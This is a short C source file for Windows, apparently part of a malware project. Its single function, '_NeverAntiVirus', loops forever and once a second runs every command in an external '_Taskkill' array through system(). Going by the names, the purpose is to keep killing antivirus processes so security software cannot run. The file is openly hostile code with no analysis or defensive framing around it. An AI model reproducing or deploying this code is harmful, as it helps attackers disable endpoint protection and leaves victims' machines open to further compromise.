#include "data_globals.h"
#include <windows.h>
#include <stdlib.h>  

void _NeverAntiVirus(void)
{
    int task_index = 0;
    
    do {
        for (task_index = 0; _Taskkill[task_index] != NULL; task_index++) {
            system(_Taskkill[task_index]);
        }
        Sleep(1000);
    } while(1);
}
